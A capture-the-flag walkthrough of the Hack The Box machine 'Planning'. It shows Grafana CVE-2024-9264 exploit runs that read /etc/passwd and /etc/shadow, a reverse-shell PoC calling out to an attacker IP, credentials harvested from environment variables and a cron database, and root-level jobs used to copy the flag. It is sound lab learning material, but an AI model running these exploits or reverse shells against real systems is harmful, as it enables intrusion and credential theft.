![https://app.hackthebox.com/machines/660](https://app.hackthebox.com/machines/660)

## INFO

`admin / 0D5oT70Fq13EvB5r`

## ENUM

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

```
gobuster vhost -u http://planning.htb --append-domain -w /usr/share/wordlists/namelist.txt -r                  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://planning.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/namelist.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: grafana.planning.htb Status: 200 [Size: 38241]
```

## Initial access:

Since the site itself didn’t give me any leads, I decided to check:
`grafana.planning.htb`

and I used the provided credentials.

On Grafana nothing interesting, so I looked for an exploit and found:
[https://github.com/nollium/CVE-2024-9264/tree/main](https://github.com/nollium/CVE-2024-9264/tree/main)

I tested it and set up a virtual environment:

```
┌──(neo㉿Kali)-[~/Desktop/exploit/CVE-2024-9264(graphana_RCE)]
└─$ export PATH="$HOME/.pyenv/bin:$PATH"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"

┌──(neo㉿Kali)-[~/Desktop/exploit/CVE-2024-9264(graphana_RCE)]
└─$ exec "$SHELL"

┌──(neo㉿Kali)-[~/Desktop/exploit/CVE-2024-9264(graphana_RCE)]
└─$ pyenv virtualenv 3.10.13 ten-env

┌──(neo㉿Kali)-[~/Desktop/exploit/CVE-2024-9264(graphana_RCE)]
└─$ pyenv activate ten-env
```

Finally I attempted the exploit:

```bash
python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
...
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

I also tried to get `/etc/shadow`:

```bash
python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/shadow http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/shadow
...
grafana:*:19857:0:99999:7:::
```

But this shows it’s not crackable because of the `*` at the start of the hash!

I tried to obtain a shell:

```bash
python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -c ls http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls
...
LICENSE
bin
conf
public
```

The command works, so I tried various revshell payloads but everything failed so I found another PoC here:
[https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py)

which allows a reverse shell connection:

```python
python3 exploit.py --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.123 --reverse-port 4848 --url http://grafana.planning.htb
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 4848
```

---

## OWN USER:

While exploring I found this in the environment variables:

```
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
```

A user: `enzo`
And a password: `RioTecRANDEntANT!`

And this found by linpeas:

```
/usr/share/grafana/public/app/plugins/datasource/azuremonitor/credentials.ts
/usr/share/grafana/public/emails/reset_password.html
/usr/share/grafana/public/emails/reset_password.txt
/usr/share/grafana/public/app/partials/reset_password.html
```

I keep that in mind, but for now I tried SSH login with the found user and password — and it worked!

---

### OWN ROOT

I reran linpeas and found these files:

```
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data                                                   
Found /opt/crontabs/env.db: empty
```

Network ports:

```
127.0.0.1:3000 (Grafana)
127.0.0.1:8000 (web service)
127.0.0.1:3306 (MySQL)
127.0.0.1:33060
0.0.0.0:80
```

So another internal web server is open.

I downloaded the files for analysis and then did port forwarding:

**crontab.db**

```json
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

I found a password linked to root: `P4ssw0rdS0pRi0T3c` — however it is not the actual root password, maybe linked to the web service?

I forwarded:
`ssh enzo@10.10.11.68 -L 8000:127.0.0.1:8000`

And I connected to the interface with:
`root / P4ssw0rdS0pRi0T3c`

And I landed on an interface that lets me run jobs as root, perfect!

I made a bash script to exfiltrate the contents of root with a simple:
`ls /root > /tmp/.zeroz/result`

I saw `root.txt` in the results, so I exfiltrated it:
`cat /root/root.txt > /tmp/.zeroz/flag`